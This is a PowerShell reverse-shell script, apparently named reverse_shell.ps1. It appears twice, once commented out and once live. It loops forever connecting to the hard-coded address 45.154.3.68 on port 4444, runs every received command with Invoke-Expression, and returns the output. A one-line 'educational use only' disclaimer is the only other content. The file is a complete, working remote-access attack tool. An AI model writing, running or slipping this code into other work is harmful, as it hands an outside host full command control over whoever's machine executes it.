# while ($true) {
#     try {
#         $client = New-Object System.Net.Sockets.TCPClient
#         $client.Connect("45.154.3.68", 4444)
#         if ($client.Connected) {
#             $stream = $client.GetStream()
#             [byte[]]$bytes = 0..65535 | % {0}
#             while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
#                 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
#                 $sendback = (iex $data 2>&1 | Out-String)
#                 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
#                 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
#                 $stream.Write($sendbyte, 0, $sendbyte.Length)
#                 $stream.Flush()
#             }
#             $client.Close()
#         }
#     } catch {
#     }
#     Start-Sleep -Seconds 10
# }

# reverse_shell.ps1
# Educational use only – do not run on unauthorized systems

$attackerIP = "45.154.3.68"     # Replace with your attacker's IP
$attackerPort = 4444            # Replace with your attacker's port

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
        if ($client.Connected) {
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

            while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
                $sendback = (Invoke-Expression $data 2>&1 | Out-String)
                $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
            }

            $client.Close()
        }
    } catch {
        # Optional: write to log file in a lab
        Start-Sleep -Seconds 5
    }

    Start-Sleep -Seconds 10
}
